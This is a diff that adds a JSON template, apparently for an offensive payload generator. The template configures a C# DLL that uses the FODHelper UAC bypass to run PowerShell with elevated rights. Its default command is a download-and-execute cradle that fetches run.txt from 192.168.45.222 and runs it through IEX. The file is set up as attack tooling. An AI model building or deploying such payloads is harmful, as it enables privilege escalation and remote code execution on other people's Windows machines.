@@ -1,0 +1,47 @@
+{
+    "category" : ["dll","uac"],
+    "description" : "Assembly that uses the FODHelper exploit to bypass UAC and run a PowerShell command in that context.",
+    "contentFile" : "dllfodhelperuac.txt",
+    
+    "customAttributes" : [
+        {
+            "name":"assemblyName",
+            "description" : "Name of the assembly.",
+            "defaultValue" : "ClassLibrary1"   
+        },
+        {
+            "name":"className",
+            "description" : "Name of the class.",
+            "defaultValue" : "Class1"   
+        },
+        {
+            "name":"methodName",
+            "description" : "Name of the method.",
+            "defaultValue" : "runner"   
+        },        
+        {
+            "name":"powershellCommand",
+            "description" : "Powershell command to run.",
+            "defaultValue" : "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.222/run.txt') | IEX"   
+        }
+    ],
+    "shellCode" : {
+        "hasShellCode":false
+    },
+    "compilation": {
+        "compilationType": "csharp",
+        "target": "library",
+        "compilationAttributes": [
+            {
+                "name": "architecture",
+                "description": "The architecture, x64 or x86.",
+                "defaultValue": "x64"
+            },
+            {
+                "name": "saveAs",
+                "description": "Name of file to be created, can be full path or just a name",
+                "defaultValue": "ClassLibrary1.dll"
+            }
+        ]
+    }
+}
